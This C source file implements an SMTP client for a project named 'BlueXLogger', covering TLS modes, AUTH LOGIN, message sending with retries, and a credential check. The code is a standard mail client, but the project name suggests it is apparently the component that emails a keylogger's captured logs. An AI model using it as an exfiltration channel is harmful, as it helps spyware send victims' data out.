/*============================================================================
 * BlueXLogger - bxl_smtp.c
 * SMTP submission client with implicit TLS, STARTTLS and AUTH LOGIN.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_smtp.h"
#include "bxl_base64.h"
#include "bxl_util.h"

/*==========================================================================
 * Configuration plumbing
 *========================================================================*/
void bxl_smtp_config_from(const BxlConfig *cfg, BxlSmtpConfig *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));

    if (!cfg) {
        out->max_attempts = 3;
        out->retry_base_ms = 2000;
        out->timeout_ms = 30000;
        return;
    }

    bxl_str_copy(out->host, sizeof(out->host), cfg->smtp_host);
    out->port     = cfg->smtp_port ? cfg->smtp_port : 465;
    out->tls_mode = cfg->tls_mode;
    out->auth     = cfg->auth_enabled ? 1 : 0;

    bxl_str_copy(out->user, sizeof(out->user), cfg->sender);
    bxl_str_copy(out->password, sizeof(out->password), cfg->app_password);

    out->timeout_ms    = 30000;
    out->max_attempts  = 3;
    out->retry_base_ms = 2000;

    bxl_hostname(out->client_name, sizeof(out->client_name));
}

int bxl_smtp_code_is_transient(int code)
{
    if (code >= 400 && code < 500) return BXL_TRUE;   /* try again later */
    if (code < 0)                  return BXL_TRUE;   /* transport error */
    return BXL_FALSE;
}

const wchar_t *bxl_smtp_stage_name(int stage)
{
    switch (stage) {
    case BXL_SMTP_STAGE_CONNECT:     return L"TCP connect";
    case BXL_SMTP_STAGE_TLS:         return L"TLS handshake";
    case BXL_SMTP_STAGE_GREETING:    return L"server greeting";
    case BXL_SMTP_STAGE_EHLO:        return L"EHLO";
    case BXL_SMTP_STAGE_STARTTLS:    return L"STARTTLS";
    case BXL_SMTP_STAGE_TLS_UPGRADE: return L"TLS upgrade";
    case BXL_SMTP_STAGE_EHLO_TLS:    return L"EHLO inside TLS";
    case BXL_SMTP_STAGE_AUTH:        return L"authentication";
    case BXL_SMTP_STAGE_MAIL_FROM:   return L"MAIL FROM";
    case BXL_SMTP_STAGE_RCPT_TO:     return L"RCPT TO";
    case BXL_SMTP_STAGE_DATA:        return L"DATA";
    case BXL_SMTP_STAGE_BODY:        return L"message body";
    case BXL_SMTP_STAGE_ACCEPT:      return L"message acceptance";
    case BXL_SMTP_STAGE_RSET:        return L"credential check";
    default:                         return L"not started";
    }
}

/*==========================================================================
 * Response reader
 *========================================================================*/
/*
 * Reads a complete SMTP reply. A reply is one or more lines; continuation
 * lines carry '-' as the fourth character, the final line carries ' '.
 * The reply code is returned, or -1 on transport failure.
 */
static int smtp_read_reply(BxlNet *n, char *first_line, size_t first_cch)
{
    char line[1024];
    int  code = -1;
    int  guard = 0;

    if (first_line && first_cch) first_line[0] = '\0';

    for (;;) {
        int len = bxl_net_recv_line(n, line, sizeof(line));
        if (len < 0) return -1;
        if (len == 0) return -1;   /* closed before a complete reply */

        if (guard == 0 && first_line && first_cch)
            bxl_str_copy(first_line, first_cch, line);

        if (len >= 3 && line[0] >= '0' && line[0] <= '9' &&
            line[1] >= '0' && line[1] <= '9' &&
            line[2] >= '0' && line[2] <= '9') {
            code = (line[0] - '0') * 100 + (line[1] - '0') * 10 + (line[2] - '0');
        }

        /* "250 " ends the reply; "250-" continues it. */
        if (len >= 4 && line[3] == '-') {
            guard++;
            if (guard > 200) return code;   /* runaway server */
            continue;
        }
        return code;
    }
}

/* Send a command and read the reply. Returns the reply code, or -1. */
static int smtp_cmd(BxlNet *n, const char *cmd, char *resp, size_t resp_cch)
{
    if (cmd) {
        if (!bxl_net_send(n, cmd, strlen(cmd))) return -1;
        if (!bxl_net_send(n, "\r\n", 2))         return -1;
    }
    return smtp_read_reply(n, resp, resp_cch);
}

/*==========================================================================
 * Session setup (connect, TLS, EHLO, AUTH)
 *========================================================================*/
static int smtp_open(BxlNet *n, const BxlSmtpConfig *scfg,
                     BxlSmtpResult *res)
{
    char line[1024];
    char cmd[512];
    int  code;

    bxl_net_init(n);
    bxl_net_set_timeout(n, scfg->timeout_ms);

    res->stage = BXL_SMTP_STAGE_CONNECT;
    if (!bxl_net_connect(n, scfg->host, scfg->port)) {
        bxl_str_copy(res->error, sizeof(res->error), bxl_net_error(n));
        return BXL_FALSE;
    }

    /* Implicit TLS (port 465): handshake happens before the greeting. */
    if (scfg->tls_mode == BXL_TLS_IMPLICIT) {
        res->stage = BXL_SMTP_STAGE_TLS;
        if (!bxl_net_starttls(n, scfg->host)) {
            bxl_str_copy(res->error, sizeof(res->error), bxl_net_error(n));
            return BXL_FALSE;
        }
    }

    res->stage = BXL_SMTP_STAGE_GREETING;
    code = smtp_read_reply(n, line, sizeof(line));
    if (code != 220) {
        if (code < 0) {
            /* Not a reply at all - the read failed. The overwhelmingly common
             * cause is a port/mode mismatch: an implicit-TLS listener waits
             * for a ClientHello and never sends a banner, so a plaintext
             * client just sits there until the socket times out. Say so,
             * because "code -1: " on its own tells the operator nothing. */
            StringCchPrintfA(res->error, sizeof(res->error),
                             "no greeting from the server (%s). If this "
                             "endpoint uses implicit TLS (port 465), set TLS "
                             "mode to Implicit; STARTTLS needs port 587.",
                             bxl_net_error(n));
        } else {
            StringCchPrintfA(res->error, sizeof(res->error),
                             "unexpected greeting (code %d): %s", code, line);
        }
        return BXL_FALSE;
    }

    /* ---- EHLO ---------------------------------------------------------- */
    res->stage = BXL_SMTP_STAGE_EHLO;
    StringCchPrintfA(cmd, sizeof(cmd), "EHLO %s",
                     scfg->client_name[0] ? scfg->client_name : "localhost");
    code = smtp_cmd(n, cmd, line, sizeof(line));

    if (code != 250) {
        /* Fall back to HELO for very old servers. */
        StringCchPrintfA(cmd, sizeof(cmd), "HELO %s",
                         scfg->client_name[0] ? scfg->client_name : "localhost");
        code = smtp_cmd(n, cmd, line, sizeof(line));
        if (code != 250) {
            StringCchPrintfA(res->error, sizeof(res->error),
                             "EHLO/HELO rejected (code %d): %s", code, line);
            return BXL_FALSE;
        }
    }

    /* ---- STARTTLS ------------------------------------------------------ */
    if (scfg->tls_mode == BXL_TLS_STARTTLS) {
        res->stage = BXL_SMTP_STAGE_STARTTLS;
        code = smtp_cmd(n, "STARTTLS", line, sizeof(line));
        if (code != 220) {
            StringCchPrintfA(res->error, sizeof(res->error),
                             "STARTTLS refused (code %d): %s", code, line);
            return BXL_FALSE;
        }
        res->stage = BXL_SMTP_STAGE_TLS_UPGRADE;
        if (!bxl_net_starttls(n, scfg->host)) {
            bxl_str_copy(res->error, sizeof(res->error), bxl_net_error(n));
            return BXL_FALSE;
        }
        /* Capabilities must be re-read inside the TLS session. */
        res->stage = BXL_SMTP_STAGE_EHLO_TLS;
        StringCchPrintfA(cmd, sizeof(cmd), "EHLO %s",
                         scfg->client_name[0] ? scfg->client_name : "localhost");
        code = smtp_cmd(n, cmd, line, sizeof(line));
        if (code != 250) {
            StringCchPrintfA(res->error, sizeof(res->error),
                             "EHLO after STARTTLS rejected (code %d): %s",
                             code, line);
            return BXL_FALSE;
        }
    }

    /* ---- AUTH LOGIN ---------------------------------------------------- */
    if (scfg->auth) {
        char *b64;

        res->stage = BXL_SMTP_STAGE_AUTH;
        code = smtp_cmd(n, "AUTH LOGIN", line, sizeof(line));
        if (code != 334) {
            StringCchPrintfA(res->error, sizeof(res->error),
                             "AUTH LOGIN refused (code %d): %s", code, line);
            return BXL_FALSE;
        }

        b64 = bxl_base64_encode_str(scfg->user, strlen(scfg->user));
        if (!b64) { bxl_str_copy(res->error, sizeof(res->error), "oom"); return BXL_FALSE; }
        code = smtp_cmd(n, b64, line, sizeof(line));
        free(b64);
        if (code != 334) {
            StringCchPrintfA(res->error, sizeof(res->error),
                             "username rejected (code %d): %s", code, line);
            return BXL_FALSE;
        }

        b64 = bxl_base64_encode_str(scfg->password, strlen(scfg->password));
        if (!b64) { bxl_str_copy(res->error, sizeof(res->error), "oom"); return BXL_FALSE; }
        code = smtp_cmd(n, b64, line, sizeof(line));
        /* Scrub the encoded credential from the stack before it is reused. */
        SecureZeroMemory(line, sizeof(line));
        free(b64);
        if (code != 235) {
            StringCchPrintfA(res->error, sizeof(res->error),
                             "authentication failed (code %d)", code);
            res->last_code = code;
            return BXL_FALSE;
        }
    }

    return BXL_TRUE;
}

/*==========================================================================
 * DATA phase
 *========================================================================*/
static int smtp_write_data(BxlNet *n, const BxlBuf *msg)
{
    const char *p = msg->data;
    size_t i = 0;
    size_t line_start = 0;

    /* RFC 5321 4.5.2: a line consisting of a single '.' is doubled. */
    for (i = 0; i < msg->len; i++) {
        if (p[i] == '\n') {
            size_t line_len = i - line_start;
            if (line_len > 0 && p[line_start] == '.') {
                if (!bxl_net_send(n, ".", 1)) return BXL_FALSE;
            }
            if (!bxl_net_send(n, p + line_start, line_len + 1)) return BXL_FALSE;
            line_start = i + 1;
        }
    }
    if (line_start < msg->len) {
        if (p[line_start] == '.') {
            if (!bxl_net_send(n, ".", 1)) return BXL_FALSE;
        }
        if (!bxl_net_send(n, p + line_start, msg->len - line_start))
            return BXL_FALSE;
    }

    /* Ensure the payload ends on a line boundary, then terminate. */
    if (msg->len == 0 || p[msg->len - 1] != '\n') {
        if (!bxl_net_send(n, "\r\n", 2)) return BXL_FALSE;
    }
    return bxl_net_send(n, ".\r\n", 3);
}

/*==========================================================================
 * One delivery attempt
 *========================================================================*/
static int smtp_attempt(const BxlSmtpConfig *scfg, const BxlMessage *msg,
                        BxlSmtpResult *res, int send_mail)
{
    BxlNet n;
    BxlBuf wire;
    char   line[1024];
    char   cmd[1024];
    int    code;
    int    ok = BXL_FALSE;

    if (!bxl_buf_init(&wire, 16384)) {
        bxl_str_copy(res->error, sizeof(res->error), "out of memory");
        return BXL_FALSE;
    }

    if (!smtp_open(&n, scfg, res)) {
        bxl_net_close(&n);
        bxl_buf_free(&wire);
        return BXL_FALSE;
    }

    if (!send_mail) {
        /* Credential check only. RSET exercises the authenticated session
         * without an envelope, which is the cheapest honest proof that the
         * server accepted the login. */
        res->stage = BXL_SMTP_STAGE_RSET;
        code = smtp_cmd(&n, "RSET", line, sizeof(line));
        res->last_code = code;
        bxl_str_copy(res->last_line, sizeof(res->last_line), line);
        if (code != 250) {
            StringCchPrintfA(res->error, sizeof(res->error),
                             "the server refused RSET after authentication "
                             "(code %d): %s", code, line);
        }
        (void)smtp_cmd(&n, "QUIT", line, sizeof(line));
        bxl_net_close(&n);
        bxl_buf_free(&wire);
        return (code == 250) ? BXL_TRUE : BXL_FALSE;
    }

    /* ---- envelope ------------------------------------------------------ */
    res->stage = BXL_SMTP_STAGE_MAIL_FROM;
    StringCchPrintfA(cmd, sizeof(cmd), "MAIL FROM:<%s>", msg->from);
    code = smtp_cmd(&n, cmd, line, sizeof(line));
    if (code != 250) {
        StringCchPrintfA(res->error, sizeof(res->error),
                         "MAIL FROM rejected (%d): %s", code, line);
        res->last_code = code;
        goto done;
    }

    res->stage = BXL_SMTP_STAGE_RCPT_TO;
    StringCchPrintfA(cmd, sizeof(cmd), "RCPT TO:<%s>", msg->to);
    code = smtp_cmd(&n, cmd, line, sizeof(line));
    if (code != 250 && code != 251) {
        StringCchPrintfA(res->error, sizeof(res->error),
                         "RCPT TO rejected (%d): %s", code, line);
        res->last_code = code;
        goto done;
    }

    /* ---- body ---------------------------------------------------------- */
    res->stage = BXL_SMTP_STAGE_DATA;
    code = smtp_cmd(&n, "DATA", line, sizeof(line));
    if (code != 354) {
        StringCchPrintfA(res->error, sizeof(res->error),
                         "DATA refused (%d): %s", code, line);
        res->last_code = code;
        goto done;
    }

    res->stage = BXL_SMTP_STAGE_BODY;
    if (!bxl_mime_build(msg, &wire)) {
        bxl_str_copy(res->error, sizeof(res->error), "MIME construction failed");
        res->last_code = -1;
        goto done;
    }

    if (!smtp_write_data(&n, &wire)) {
        bxl_str_copy(res->error, sizeof(res->error), bxl_net_error(&n));
        res->last_code = -1;
        goto done;
    }

    res->stage = BXL_SMTP_STAGE_ACCEPT;
    code = smtp_read_reply(&n, line, sizeof(line));
    res->last_code = code;
    bxl_str_copy(res->last_line, sizeof(res->last_line), line);
    if (code != 250) {
        StringCchPrintfA(res->error, sizeof(res->error),
                         "message rejected (%d): %s", code, line);
        goto done;
    }

    ok = BXL_TRUE;
    (void)smtp_cmd(&n, "QUIT", line, sizeof(line));

done:
    bxl_net_close(&n);
    bxl_buf_free(&wire);
    return ok;
}

/*==========================================================================
 * Public entry points
 *========================================================================*/
static int smtp_run(const BxlSmtpConfig *scfg, const BxlMessage *msg,
                    BxlSmtpResult *res, int send_mail)
{
    int attempt;
    int attempts;
    int delay;

    if (!scfg || !res) return BXL_FALSE;

    memset(res, 0, sizeof(*res));
    res->last_code = -1;
    attempts = (scfg->max_attempts >= 1) ? scfg->max_attempts : 1;
    delay    = (scfg->retry_base_ms > 0) ? scfg->retry_base_ms : 2000;

    {
        bxl_u64 t0 = bxl_now_ms();

        for (attempt = 1; attempt <= attempts; attempt++) {
            res->attempts = attempt;
            res->error[0] = '\0';

            if (smtp_attempt(scfg, msg, res, send_mail)) {
                res->ok = BXL_TRUE;
                res->elapsed_ms = (bxl_u32)(bxl_now_ms() - t0);
                return BXL_TRUE;
            }

            if (!bxl_smtp_code_is_transient(res->last_code)) break;
            if (attempt == attempts) break;

            bxl_logf("smtp: attempt %d/%d failed (%s) - retrying in %d ms",
                     attempt, attempts, res->error, delay);

            Sleep((DWORD)delay);
            delay *= 2;
            if (delay > 60000) delay = 60000;
        }

        res->ok = BXL_FALSE;
        res->elapsed_ms = (bxl_u32)(bxl_now_ms() - t0);
    }

    if (res->error[0] == '\0')
        bxl_str_copy(res->error, sizeof(res->error), "delivery failed");

    return BXL_FALSE;
}

int bxl_smtp_send(const BxlSmtpConfig *scfg, const BxlMessage *msg,
                  BxlSmtpResult *res)
{
    if (!msg) return BXL_FALSE;
    return smtp_run(scfg, msg, res, 1);
}

int bxl_smtp_verify(const BxlSmtpConfig *scfg, BxlSmtpResult *res)
{
    BxlMessage dummy;
    memset(&dummy, 0, sizeof(dummy));
    return smtp_run(scfg, &dummy, res, 0);
}
